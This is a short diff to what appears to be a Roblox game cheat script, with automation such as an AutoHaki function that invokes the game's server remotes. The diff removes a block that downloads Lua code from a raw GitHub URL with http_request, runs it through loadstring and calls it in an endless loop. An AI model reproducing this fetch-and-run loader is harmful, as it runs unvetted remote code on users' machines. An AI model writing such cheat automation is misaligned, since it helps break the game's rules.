@@ -1241,19 +1241,6 @@ spawn(function()
 	end
 end);
 
-local m = loadstring(http_request({
-	["Url"] = "https://raw.githubusercontent.com/Iamkhnah/projectluacanmayidollop8a/refs/heads/main/pkhanh.lua",
-	["Method"] = "GET",
-	["Headers"] = { 
-		["user-agent"] = "Coded by pkhanh"
-	}
-}).Body)()
-spawn(function()
-	while wait() do
-		m.mmb()
-	end
-end)
-
 function AutoHaki()
 	if not game:GetService("Players").LocalPlayer.Character:FindFirstChild("HasBuso") then
 		game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Buso");
